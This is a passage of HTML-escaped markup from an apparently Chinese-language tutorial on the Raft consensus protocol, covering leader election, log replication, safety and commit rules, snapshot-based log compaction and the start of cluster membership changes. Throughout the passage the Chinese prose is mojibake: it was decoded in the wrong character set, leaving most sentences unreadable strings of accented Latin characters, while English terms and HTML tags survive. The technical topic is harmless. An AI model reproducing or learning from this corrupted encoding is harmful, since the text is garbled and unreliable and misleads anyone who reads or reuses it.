&lt;p&gt;&lt;strong&gt;Leader&lt;/strong&gt;ï¼šæ‰€æœ‰è¯·æ±‚çš„å¤„ç†è€…ï¼ŒLeaderå‰¯æœ¬æ¥å—clientçš„æ›´æ–°è¯·æ±‚ï¼Œæœ¬åœ°å¤„ç†åå†åŒæ­¥è‡³å¤šä¸ªå…¶ä»–å‰¯æœ¬ï¼›&lt;br&gt;
&lt;strong&gt;Follower&lt;/strong&gt;ï¼šè¯·æ±‚çš„è¢«åŠ¨æ›´æ–°è€…ï¼Œä»Leaderæ¥å—æ›´æ–°è¯·æ±‚ï¼Œç„¶åå†™å…¥æœ¬åœ°æ—¥å¿—æ–‡ä»¶&lt;br&gt;
&lt;strong&gt;Candidate&lt;/strong&gt;ï¼šå¦‚æœFollowerå‰¯æœ¬åœ¨ä¸€æ®µæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°Leaderå‰¯æœ¬çš„å¿ƒè·³ï¼Œåˆ™åˆ¤æ–­Leaderå¯èƒ½å·²ç»æ•…éšœï¼Œæ­¤æ—¶å¯åŠ¨é€‰ä¸»è¿‡ç¨‹ï¼Œæ­¤æ—¶å‰¯æœ¬ä¼šå˜æˆCandidateçŠ¶æ€ï¼Œç›´åˆ°é€‰ä¸»ç»“æŸã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ—¶é—´è¢«åˆ†ä¸ºå¾ˆå¤šè¿ç»­çš„éšæœºé•¿åº¦çš„termï¼Œtermæœ‰å”¯ä¸€çš„idã€‚æ¯ä¸ªtermä¸€å¼€å§‹å°±è¿›è¡Œé€‰ä¸»ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Followerå°†è‡ªå·±ç»´æŠ¤çš„current_term_idåŠ 1ã€‚&lt;/li&gt;
&lt;li&gt;ç„¶åå°†è‡ªå·±çš„çŠ¶æ€è½¬æˆCandidate&lt;/li&gt;
&lt;li&gt;å‘é€RequestVoteRPCæ¶ˆæ¯(å¸¦ä¸Šcurrent_term_id) ç»™ å…¶å®ƒæ‰€æœ‰server&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;è¿™ä¸ªè¿‡ç¨‹ä¼šæœ‰ä¸‰ç§ç»“æœï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è‡ªå·±è¢«é€‰æˆäº†ä¸»ã€‚å½“æ”¶åˆ°äº†majorityçš„æŠ•ç¥¨åï¼ŒçŠ¶æ€åˆ‡æˆLeaderï¼Œå¹¶ä¸”å®šæœŸç»™å…¶å®ƒçš„æ‰€æœ‰serverå‘å¿ƒè·³æ¶ˆæ¯ï¼ˆä¸å¸¦logçš„AppendEntriesRPCï¼‰ä»¥å‘Šè¯‰å¯¹æ–¹è‡ªå·±æ˜¯current_term_idæ‰€æ ‡è¯†çš„termçš„leaderã€‚æ¯ä¸ªtermæœ€å¤šåªæœ‰ä¸€ä¸ªleaderï¼Œterm idä½œä¸ºlogical clockï¼Œåœ¨æ¯ä¸ªRPCæ¶ˆæ¯ä¸­éƒ½ä¼šå¸¦ä¸Šï¼Œç”¨äºæ£€æµ‹è¿‡æœŸçš„æ¶ˆæ¯ã€‚å½“ä¸€ä¸ªserveræ”¶åˆ°çš„RPCæ¶ˆæ¯ä¸­çš„rpc_term_idæ¯”æœ¬åœ°çš„current_term_idæ›´å¤§æ—¶ï¼Œå°±æ›´æ–°current_term_idä¸ºrpc_term_idï¼Œå¹¶ä¸”å¦‚æœå½“å‰stateä¸ºleaderæˆ–è€…candidateæ—¶ï¼Œå°†è‡ªå·±çš„çŠ¶æ€åˆ‡æˆfollowerã€‚å¦‚æœrpc_term_idæ¯”æœ¬åœ°çš„current_term_idæ›´å°ï¼Œåˆ™æ‹’ç»è¿™ä¸ªRPCæ¶ˆæ¯ã€‚&lt;/li&gt;
&lt;li&gt;åˆ«äººæˆä¸ºäº†ä¸»ã€‚å¦‚1æ‰€è¿°ï¼Œå½“Candidatoråœ¨ç­‰å¾…æŠ•ç¥¨çš„è¿‡ç¨‹ä¸­ï¼Œæ”¶åˆ°äº†å¤§äºæˆ–è€…ç­‰äºæœ¬åœ°çš„current_term_idçš„å£°æ˜å¯¹æ–¹æ˜¯leaderçš„AppendEntriesRPCæ—¶ï¼Œåˆ™å°†è‡ªå·±çš„stateåˆ‡æˆfollowerï¼Œå¹¶ä¸”æ›´æ–°æœ¬åœ°çš„current_term_idã€‚&lt;/li&gt;
&lt;li&gt;æ²¡æœ‰é€‰å‡ºä¸»ã€‚å½“æŠ•ç¥¨è¢«ç“œåˆ†ï¼Œæ²¡æœ‰ä»»ä½•ä¸€ä¸ªcandidateæ”¶åˆ°äº†majorityçš„voteæ—¶ï¼Œæ²¡æœ‰leaderè¢«é€‰å‡ºã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæ¯ä¸ªcandidateç­‰å¾…çš„æŠ•ç¥¨çš„è¿‡ç¨‹å°±è¶…æ—¶äº†ï¼Œæ¥ç€candidateséƒ½ä¼šå°†æœ¬åœ°çš„current_term_idå†åŠ 1ï¼Œå‘èµ·RequestVoteRPCè¿›è¡Œæ–°ä¸€è½®çš„leader electionã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æŠ•ç¥¨ç­–ç•¥ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ¯ä¸ªèŠ‚ç‚¹åªä¼šç»™æ¯ä¸ªtermæŠ•ä¸€ç¥¨ï¼Œå…·ä½“çš„æ˜¯å¦åŒæ„å’Œåç»­çš„Safetyæœ‰å…³ã€‚&lt;/li&gt;
&lt;li&gt;å½“æŠ•ç¥¨è¢«ç“œåˆ†åï¼Œæ‰€æœ‰çš„candidateåŒæ—¶è¶…æ—¶ï¼Œç„¶åæœ‰å¯èƒ½è¿›å…¥æ–°ä¸€è½®çš„ç¥¨æ•°è¢«ç“œåˆ†ï¼Œä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜ï¼ŒRafté‡‡ç”¨ä¸€ç§å¾ˆç®€å•çš„æ–¹æ³•ï¼šæ¯ä¸ªCandidateçš„election timeoutä»150ms-300msä¹‹é—´éšæœºå–ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªè¶…æ—¶çš„Candidateå°±å¯ä»¥å‘èµ·æ–°ä¸€è½®çš„leader electionï¼Œå¸¦ç€æœ€å¤§çš„term_idç»™å…¶å®ƒæ‰€æœ‰serverå‘é€RequestVoteRPCæ¶ˆæ¯ï¼Œä»è€Œè‡ªå·±æˆä¸ºleaderï¼Œç„¶åç»™ä»–ä»¬å‘é€å¿ƒè·³æ¶ˆæ¯ä»¥å‘Šè¯‰ä»–ä»¬è‡ªå·±æ˜¯ä¸»ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Log Replication&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å½“Leaderè¢«é€‰å‡ºæ¥åï¼Œå°±å¯ä»¥æ¥å—&lt;a href=&#34;https://www.zhihu.com/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&amp;amp;search_source=Entity&amp;amp;hybrid_search_source=Entity&amp;amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2227207160%22%7D&#34;&gt;å®¢æˆ·ç«¯&lt;/a&gt;å‘æ¥çš„è¯·æ±‚äº†ï¼Œæ¯ä¸ªè¯·æ±‚åŒ…å«ä¸€æ¡éœ€è¦è¢«replicated state machinesæ‰§è¡Œçš„å‘½ä»¤ã€‚leaderä¼šæŠŠå®ƒä½œä¸ºä¸€ä¸ªlog entry appendåˆ°æ—¥å¿—ä¸­ï¼Œç„¶åç»™å…¶å®ƒçš„serverå‘AppendEntriesRPCè¯·æ±‚ã€‚å½“Leaderç¡®å®šä¸€ä¸ªlog entryè¢«safely replicatedäº†ï¼ˆå¤§å¤šæ•°å‰¯æœ¬å·²ç»å°†è¯¥å‘½ä»¤å†™å…¥æ—¥å¿—å½“ä¸­ï¼‰ï¼Œå°±applyè¿™æ¡log entryåˆ°çŠ¶æ€æœºä¸­ç„¶åè¿”å›ç»“æœç»™å®¢æˆ·ç«¯ã€‚å¦‚æœæŸä¸ªFollowerå®•æœºäº†æˆ–è€…è¿è¡Œçš„å¾ˆæ…¢ï¼Œæˆ–è€…ç½‘ç»œä¸¢åŒ…äº†ï¼Œåˆ™ä¼šä¸€ç›´ç»™è¿™ä¸ªFollowerå‘AppendEntriesRPCç›´åˆ°æ—¥å¿—ä¸€è‡´ã€‚&lt;/p&gt;
&lt;p&gt;å½“ä¸€æ¡æ—¥å¿—æ˜¯commitedæ—¶ï¼ŒLeaderæ‰å¯ä»¥å°†å®ƒåº”ç”¨åˆ°çŠ¶æ€æœºä¸­ã€‚Raftä¿è¯ä¸€æ¡commitedçš„log entryå·²ç»æŒä¹…åŒ–äº†å¹¶ä¸”ä¼šè¢«æ‰€æœ‰çš„èŠ‚ç‚¹æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;å½“ä¸€ä¸ªæ–°çš„Leaderè¢«é€‰å‡ºæ¥æ—¶ï¼Œå®ƒçš„æ—¥å¿—å’Œå…¶å®ƒçš„Followerçš„æ—¥å¿—å¯èƒ½ä¸ä¸€æ ·ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå°±éœ€è¦ä¸€ä¸ªæœºåˆ¶æ¥ä¿è¯æ—¥å¿—çš„ä¸€è‡´æ€§ã€‚ä¸€ä¸ªæ–°leaderäº§ç”Ÿæ—¶ï¼Œé›†ç¾¤çŠ¶æ€å¯èƒ½å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://pic4.zhimg.com/v2-8884bbb61f0eed0aba4e8320c2692783_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æœ€ä¸Šé¢è¿™ä¸ªæ˜¯æ–°Leaderï¼Œa~fæ˜¯Followerï¼Œæ¯ä¸ªæ ¼å­ä»£è¡¨ä¸€æ¡log entryï¼Œæ ¼å­å†…çš„æ•°å­—ä»£è¡¨è¿™ä¸ªlog entryæ˜¯åœ¨å“ªä¸ªtermä¸Šäº§ç”Ÿçš„ã€‚&lt;/p&gt;
&lt;p&gt;æ–°Leaderäº§ç”Ÿåï¼Œå°±ä»¥Leaderä¸Šçš„logä¸ºå‡†ã€‚å…¶å®ƒçš„followerè¦ä¹ˆå°‘äº†æ•°æ®æ¯”å¦‚bï¼Œè¦ä¹ˆå¤šäº†æ•°æ®ï¼Œæ¯”å¦‚dï¼Œè¦ä¹ˆæ—¢å°‘äº†åˆå¤šäº†æ•°æ®ï¼Œæ¯”å¦‚fã€‚&lt;/p&gt;
&lt;p&gt;å› æ­¤ï¼Œéœ€è¦æœ‰ä¸€ç§æœºåˆ¶æ¥è®©leaderå’Œfollowerå¯¹logè¾¾æˆä¸€è‡´ï¼Œleaderä¼šä¸ºæ¯ä¸ªfollowerç»´æŠ¤ä¸€ä¸ªnextIndexï¼Œè¡¨ç¤ºleaderç»™å„ä¸ªfollowerå‘é€çš„ä¸‹ä¸€æ¡log entryåœ¨logä¸­çš„indexï¼Œåˆå§‹åŒ–ä¸ºleaderçš„æœ€åä¸€æ¡log entryçš„ä¸‹ä¸€ä¸ªä½ç½®ã€‚leaderç»™followerå‘é€AppendEntriesRPCæ¶ˆæ¯ï¼Œå¸¦ç€(term_id, (nextIndex-1))ï¼Œ term_idå³(nextIndex-1)è¿™ä¸ªæ§½ä½çš„log entryçš„term_idï¼Œfolloweræ¥æ”¶åˆ°AppendEntriesRPCåï¼Œä¼šä»è‡ªå·±çš„logä¸­æ‰¾æ˜¯ä¸æ˜¯å­˜åœ¨è¿™æ ·çš„log entryï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°±ç»™leaderå›å¤æ‹’ç»æ¶ˆæ¯ï¼Œç„¶åleaderåˆ™å°†nextIndexå‡1ï¼Œå†é‡å¤ï¼ŒçŸ¥é“AppendEntriesRPCæ¶ˆæ¯è¢«æ¥æ”¶ã€‚&lt;/p&gt;
&lt;p&gt;ä»¥leaderå’Œbä¸ºä¾‹ï¼š&lt;/p&gt;
&lt;p&gt;åˆå§‹åŒ–ï¼ŒnextIndexä¸º11ï¼Œleaderç»™bå‘é€AppendEntriesRPC(6,10)ï¼Œbåœ¨è‡ªå·±logçš„10å·æ§½ä½ä¸­æ²¡æœ‰æ‰¾åˆ°term_idä¸º6çš„log entryã€‚åˆ™ç»™leaderå›åº”ä¸€ä¸ªæ‹’ç»æ¶ˆæ¯ã€‚æ¥ç€ï¼Œleaderå°†nextIndexå‡ä¸€ï¼Œå˜æˆ10ï¼Œç„¶åç»™bå‘é€AppendEntriesRPC(6, 9)ï¼Œbåœ¨è‡ªå·±logçš„9å·æ§½ä½ä¸­åŒæ ·æ²¡æœ‰æ‰¾åˆ°term_idä¸º6çš„log entryã€‚å¾ªç¯ä¸‹å»ï¼Œç›´åˆ°leaderå‘é€äº†AppendEntriesRPC(4,4)ï¼Œbåœ¨è‡ªå·±logçš„æ§½ä½4ä¸­æ‰¾åˆ°äº†term_idä¸º4çš„log entryã€‚æ¥æ”¶äº†æ¶ˆæ¯ã€‚éšåï¼Œleaderå°±å¯ä»¥ä»æ§½ä½5å¼€å§‹ç»™bæ¨é€æ—¥å¿—äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Safety&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å“ªäº›followeræœ‰èµ„æ ¼æˆä¸ºleader?&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Raftä¿è¯è¢«é€‰ä¸ºæ–°leaderçš„èŠ‚ç‚¹æ‹¥æœ‰æ‰€æœ‰å·²æäº¤çš„log entryï¼Œè¿™ä¸ViewStamped Replicationä¸åŒï¼Œåè€…ä¸éœ€è¦è¿™ä¸ªä¿è¯ï¼Œè€Œæ˜¯é€šè¿‡å…¶ä»–æœºåˆ¶ä»followeræ‹‰å–è‡ªå·±æ²¡æœ‰çš„æäº¤çš„æ—¥å¿—è®°å½•&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;è¿™ä¸ªä¿è¯æ˜¯åœ¨RequestVoteRPCé˜¶æ®µåšçš„ï¼Œcandidateåœ¨å‘é€RequestVoteRPCæ—¶ï¼Œä¼šå¸¦ä¸Šè‡ªå·±çš„æœ€åä¸€æ¡æ—¥å¿—è®°å½•çš„term_idå’Œindexï¼Œå…¶ä»–èŠ‚ç‚¹æ”¶åˆ°æ¶ˆæ¯æ—¶ï¼Œå¦‚æœå‘ç°è‡ªå·±çš„æ—¥å¿—æ¯”RPCè¯·æ±‚ä¸­æºå¸¦çš„æ›´æ–°ï¼Œæ‹’ç»æŠ•ç¥¨ã€‚æ—¥å¿—æ¯”è¾ƒçš„åŸåˆ™æ˜¯ï¼Œå¦‚æœæœ¬åœ°çš„æœ€åä¸€æ¡log entryçš„term idæ›´å¤§ï¼Œåˆ™æ›´æ–°ï¼Œå¦‚æœterm idä¸€æ ·å¤§ï¼Œåˆ™æ—¥å¿—æ›´å¤šçš„æ›´å¤§(indexæ›´å¤§)ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å“ªäº›æ—¥å¿—è®°å½•è¢«è®¤ä¸ºæ˜¯commited?&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;leaderæ­£åœ¨replicateå½“å‰termï¼ˆå³term 2ï¼‰çš„æ—¥å¿—è®°å½•ç»™å…¶å®ƒFollowerï¼Œä¸€æ—¦leaderç¡®è®¤äº†è¿™æ¡log entryè¢«majorityå†™ç›˜äº†ï¼Œè¿™æ¡log entryå°±è¢«è®¤ä¸ºæ˜¯committedã€‚å¦‚å›¾aï¼ŒS1ä½œä¸ºå½“å‰termå³term2çš„leaderï¼Œlog indexä¸º2çš„æ—¥å¿—è¢«majorityå†™ç›˜äº†ï¼Œè¿™æ¡log entryè¢«è®¤ä¸ºæ˜¯commited&lt;/li&gt;
&lt;li&gt;leaderæ­£åœ¨replicateæ›´æ—©çš„termçš„log entryç»™å…¶å®ƒfollowerã€‚å›¾bçš„çŠ¶æ€æ˜¯è¿™ä¹ˆå‡ºæ¥çš„ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;å¯¹åè®®çš„ä¸€ç‚¹ä¿®æ­£&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨å®é™…çš„åè®®ä¸­ï¼Œéœ€è¦è¿›è¡Œä¸€äº›å¾®è°ƒï¼Œè¿™æ˜¯å› ä¸ºå¯èƒ½ä¼šå‡ºç°ä¸‹é¢è¿™ç§æƒ…å†µï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://pic3.zhimg.com/v2-77762ec1707940412736c332376dd0c6_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;åœ¨é˜¶æ®µaï¼Œtermä¸º2ï¼ŒS1æ˜¯Leaderï¼Œä¸”S1å†™å…¥æ—¥å¿—ï¼ˆterm, indexï¼‰ä¸º(2, 2)ï¼Œå¹¶ä¸”æ—¥å¿—è¢«åŒæ­¥å†™å…¥äº†S2ï¼›&lt;/li&gt;
&lt;li&gt;åœ¨é˜¶æ®µbï¼ŒS1ç¦»çº¿ï¼Œè§¦å‘ä¸€æ¬¡æ–°çš„é€‰ä¸»ï¼Œæ­¤æ—¶S5è¢«é€‰ä¸ºæ–°çš„Leaderï¼Œæ­¤æ—¶ç³»ç»Ÿtermä¸º3ï¼Œä¸”å†™å…¥äº†æ—¥å¿—ï¼ˆterm, indexï¼‰ä¸ºï¼ˆ3ï¼Œ 2ï¼‰;&lt;/li&gt;
&lt;li&gt;S5å°šæœªå°†æ—¥å¿—æ¨é€åˆ°Followerså˜ç¦»çº¿äº†ï¼Œè¿›è€Œè§¦å‘äº†ä¸€æ¬¡æ–°çš„é€‰ä¸»ï¼Œè€Œä¹‹å‰ç¦»çº¿çš„S1ç»è¿‡é‡æ–°ä¸Šçº¿åè¢«é€‰ä¸­å˜æˆLeaderï¼Œæ­¤æ—¶ç³»ç»Ÿtermä¸º4ï¼Œæ­¤æ—¶S1ä¼šå°†è‡ªå·±çš„æ—¥å¿—åŒæ­¥åˆ°Followersï¼ŒæŒ‰ç…§ä¸Šå›¾å°±æ˜¯å°†æ—¥å¿—ï¼ˆ2ï¼Œ 2ï¼‰åŒæ­¥åˆ°äº†S3ï¼Œè€Œæ­¤æ—¶ç”±äºè¯¥æ—¥å¿—å·²ç»è¢«åŒæ­¥åˆ°äº†å¤šæ•°èŠ‚ç‚¹ï¼ˆS1, S2, S3ï¼‰ï¼Œå› æ­¤ï¼Œæ­¤æ—¶æ—¥å¿—ï¼ˆ2ï¼Œ2ï¼‰å¯ä»¥è¢«commitäº†ï¼ˆå³æ›´æ–°åˆ°çŠ¶æ€æœºï¼‰ï¼›&lt;/li&gt;
&lt;li&gt;åœ¨é˜¶æ®µdï¼ŒS1åˆå¾ˆä¸å¹¸åœ°ä¸‹çº¿äº†ï¼Œç³»ç»Ÿè§¦å‘ä¸€æ¬¡é€‰ä¸»ï¼Œè€ŒS5æœ‰å¯èƒ½è¢«é€‰ä¸ºæ–°çš„Leaderï¼ˆè¿™æ˜¯å› ä¸ºS5å¯ä»¥æ»¡è¶³ä½œä¸ºä¸»çš„ä¸€åˆ‡æ¡ä»¶ï¼š1. term = 3 &amp;gt; 2, 2. æœ€æ–°çš„æ—¥å¿—indexä¸º2ï¼Œæ¯”å¤§å¤šæ•°èŠ‚ç‚¹ï¼ˆå¦‚S2/S3/S4çš„æ—¥å¿—éƒ½æ–°ï¼‰ï¼Œç„¶åS5ä¼šå°†è‡ªå·±çš„æ—¥å¿—æ›´æ–°åˆ°Followersï¼Œäºæ˜¯S2ã€S3ä¸­å·²ç»è¢«æäº¤çš„æ—¥å¿—ï¼ˆ2ï¼Œ2ï¼‰è¢«æˆªæ–­äº†ï¼Œè¿™æ˜¯è‡´å‘½æ€§çš„é”™è¯¯ï¼Œå› ä¸ºä¸€è‡´æ€§åè®®ä¸­ä¸å…è®¸å‡ºç°å·²ç»åº”ç”¨åˆ°çŠ¶æ€æœºä¸­çš„æ—¥å¿—è¢«æˆªæ–­ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¸ºäº†é¿å…è¿™ç§è‡´å‘½é”™è¯¯ï¼Œéœ€è¦å¯¹åè®®è¿›è¡Œä¸€ä¸ªå¾®è°ƒï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åªå…è®¸ä¸»èŠ‚ç‚¹æäº¤åŒ…å«å½“å‰termçš„æ—¥å¿—&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;é’ˆå¯¹ä¸Šè¿°æƒ…å†µå°±æ˜¯ï¼šå³ä½¿æ—¥å¿—ï¼ˆ2ï¼Œ2ï¼‰å·²ç»è¢«å¤§å¤šæ•°èŠ‚ç‚¹ï¼ˆS1ã€S2ã€S3ï¼‰ç¡®è®¤äº†ï¼Œä½†æ˜¯å®ƒä¸èƒ½è¢«Commitï¼Œå› ä¸ºå®ƒæ˜¯æ¥è‡ªä¹‹å‰term(2)çš„æ—¥å¿—ï¼Œç›´åˆ°S1åœ¨å½“å‰termï¼ˆ4ï¼‰äº§ç”Ÿçš„æ—¥å¿—ï¼ˆ4ï¼Œ 3ï¼‰è¢«å¤§å¤šæ•°Followerç¡®è®¤ï¼ŒS1æ–¹å¯Commitï¼ˆ4ï¼Œ3ï¼‰è¿™æ¡æ—¥å¿—ï¼Œå½“ç„¶ï¼Œæ ¹æ®Raftå®šä¹‰ï¼Œï¼ˆ4ï¼Œ3ï¼‰ä¹‹å‰çš„æ‰€æœ‰æ—¥å¿—ä¹Ÿä¼šè¢«Commitã€‚æ­¤æ—¶å³ä½¿S1å†ä¸‹çº¿ï¼Œé‡æ–°é€‰ä¸»æ—¶S5ä¸å¯èƒ½æˆä¸ºLeaderï¼Œå› ä¸ºå®ƒæ²¡æœ‰åŒ…å«å¤§å¤šæ•°èŠ‚ç‚¹å·²ç»æ‹¥æœ‰çš„æ—¥å¿—ï¼ˆ4ï¼Œ3ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Log Compaction&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨å®é™…çš„ç³»ç»Ÿä¸­ï¼Œä¸èƒ½è®©æ—¥å¿—æ— é™å¢é•¿ï¼Œå¦åˆ™ç³»ç»Ÿé‡å¯æ—¶éœ€è¦èŠ±å¾ˆé•¿çš„æ—¶é—´è¿›è¡Œå›æ”¾ï¼Œä»è€Œå½±å“availabilityã€‚Rafté‡‡ç”¨å¯¹æ•´ä¸ªç³»ç»Ÿè¿›è¡Œsnapshotæ¥å¤„ç†ï¼Œsnapshotä¹‹å‰çš„æ—¥å¿—éƒ½å¯ä»¥ä¸¢å¼ƒã€‚SnapshotæŠ€æœ¯åœ¨Chubbyå’ŒZooKeeperç³»ç»Ÿä¸­éƒ½æœ‰é‡‡ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;Raftä½¿ç”¨çš„æ–¹æ¡ˆæ˜¯ï¼š*&lt;strong&gt;æ¯ä¸ªå‰¯æœ¬ç‹¬ç«‹çš„å¯¹è‡ªå·±çš„ç³»ç»ŸçŠ¶æ€è¿›è¡ŒSnapshotï¼Œå¹¶ä¸”åªèƒ½å¯¹å·²ç»æäº¤çš„æ—¥å¿—è®°å½•ï¼ˆå·²ç»åº”ç”¨åˆ°çŠ¶æ€æœºï¼‰è¿›è¡Œsnapshotã€‚*&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Snapshotä¸­åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ—¥å¿—å…ƒæ•°æ®ï¼Œæœ€åä¸€æ¡commited log entryçš„ (log index, last_included_term)ã€‚è¿™ä¸¤ä¸ªå€¼åœ¨Snapshotä¹‹åçš„ç¬¬ä¸€æ¡log entryçš„AppendEntriesRPCçš„consistency checkçš„æ—¶å€™ä¼šè¢«ç”¨ä¸Šï¼Œä¹‹å‰è®²è¿‡ã€‚ä¸€æ—¦è¿™ä¸ªserveråšå®Œäº†snapshotï¼Œå°±å¯ä»¥æŠŠè¿™æ¡è®°å½•çš„æœ€åä¸€æ¡log indexåŠå…¶ä¹‹å‰çš„æ‰€æœ‰çš„log entryéƒ½åˆ æ‰ã€‚&lt;/li&gt;
&lt;li&gt;ç³»ç»ŸçŠ¶æ€æœºï¼šå­˜å‚¨ç³»ç»Ÿå½“å‰çŠ¶æ€ï¼ˆè¿™æ˜¯æ€ä¹ˆç”Ÿæˆçš„å‘¢ï¼Ÿï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;snapshotçš„ç¼ºç‚¹å°±æ˜¯ä¸æ˜¯å¢é‡çš„ï¼Œå³ä½¿å†…å­˜ä¸­æŸä¸ªå€¼æ²¡æœ‰å˜ï¼Œä¸‹æ¬¡åšsnapshotçš„æ—¶å€™åŒæ ·ä¼šè¢«dumpåˆ°ç£ç›˜ã€‚å½“leaderéœ€è¦å‘ç»™æŸä¸ªfollowerçš„log entryè¢«ä¸¢å¼ƒäº†(å› ä¸ºleaderåšäº†snapshot)ï¼Œleaderä¼šå°†snapshotå‘ç»™è½åå¤ªå¤šçš„followerã€‚æˆ–è€…å½“æ–°åŠ è¿›ä¸€å°æœºå™¨æ—¶ï¼Œä¹Ÿä¼šå‘é€snapshotç»™å®ƒã€‚å‘é€snapshotä½¿ç”¨æ–°çš„RPCï¼ŒInstalledSnapshotã€‚&lt;/p&gt;
&lt;p&gt;åšsnapshotæœ‰ä¸€äº›éœ€è¦æ³¨æ„çš„æ€§èƒ½ç‚¹ï¼Œ1. ä¸è¦åšå¤ªé¢‘ç¹ï¼Œå¦åˆ™æ¶ˆè€—ç£ç›˜å¸¦å®½ã€‚ 2. ä¸è¦åšçš„å¤ªä¸é¢‘ç¹ï¼Œå¦åˆ™ä¸€æ—¦èŠ‚ç‚¹é‡å¯éœ€è¦å›æ”¾å¤§é‡æ—¥å¿—ï¼Œå½±å“å¯ç”¨æ€§ã€‚ç³»ç»Ÿæ¨èå½“æ—¥å¿—è¾¾åˆ°æŸä¸ªå›ºå®šçš„å¤§å°åšä¸€æ¬¡snapshotã€‚3. åšä¸€æ¬¡snapshotå¯èƒ½è€—æ—¶è¿‡é•¿ï¼Œä¼šå½±å“æ­£å¸¸log entryçš„replicateã€‚è¿™ä¸ªå¯ä»¥é€šè¿‡ä½¿ç”¨copy-on-writeçš„æŠ€æœ¯æ¥é¿å…snapshotè¿‡ç¨‹å½±å“æ­£å¸¸log entryçš„replicateã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;é›†ç¾¤æ‹“æ‰‘å˜åŒ–&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é›†ç¾¤æ‹“æ‰‘å˜åŒ–çš„æ„æ€æ˜¯åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å¤šå‰¯æœ¬é›†ç¾¤çš„ç»“æ„æ€§å˜åŒ–ï¼Œå¦‚å¢åŠ /å‡å°‘å‰¯æœ¬æ•°ã€èŠ‚ç‚¹æ›¿æ¢ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;Raftåè®®å®šä¹‰æ—¶ä¹Ÿè€ƒè™‘äº†è¿™ç§æƒ…å†µï¼Œä»è€Œé¿å…ç”±äºä¸‹çº¿è€é›†ç¾¤ä¸Šçº¿æ–°é›†ç¾¤è€Œå¼•èµ·çš„ç³»ç»Ÿä¸å¯ç”¨ã€‚Raftä¹Ÿæ˜¯åˆ©ç”¨ä¸Šé¢çš„Log Entryå’Œä¸€è‡´æ€§åè®®æ¥å®ç°è¯¥åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;p&gt;å‡è®¾åœ¨Raftä¸­ï¼Œè€é›†ç¾¤é…ç½®ç”¨Coldè¡¨ç¤ºï¼Œæ–°é›†ç¾¤é…ç½®ç”¨Cnewè¡¨ç¤ºï¼Œæ•´ä¸ªé›†ç¾¤æ‹“æ‰‘å˜åŒ–çš„æµç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å½“é›†ç¾¤æˆå‘˜é…ç½®æ”¹å˜æ—¶ï¼Œleaderæ”¶åˆ°äººå·¥å‘å‡ºçš„é‡é…ç½®å‘½ä»¤ä»Coldåˆ‡æˆCnewï¼›&lt;/li&gt;
&lt;li&gt;Leaderå‰¯æœ¬åœ¨æœ¬åœ°ç”Ÿæˆä¸€ä¸ªæ–°çš„log entryï¼Œå…¶å†…å®¹æ˜¯ColdâˆªCnewï¼Œä»£è¡¨å½“å‰æ—¶åˆ»æ–°æ—§æ‹“æ‰‘é…ç½®å…±å­˜ï¼Œå†™å…¥æœ¬åœ°æ—¥å¿—ï¼ŒåŒæ—¶å°†è¯¥log entryæ¨é€è‡³å…¶ä»–FollowerèŠ‚ç‚¹&lt;/li&gt;
&lt;li&gt;Followerå‰¯æœ¬æ”¶åˆ°log entryåæ›´æ–°æœ¬åœ°æ—¥å¿—ï¼Œå¹¶ä¸”æ­¤æ—¶å°±ä»¥è¯¥é…ç½®ä½œä¸ºè‡ªå·±äº†è§£çš„å…¨å±€æ‹“æ‰‘ç»“æ„ï¼Œ&lt;/li&gt;
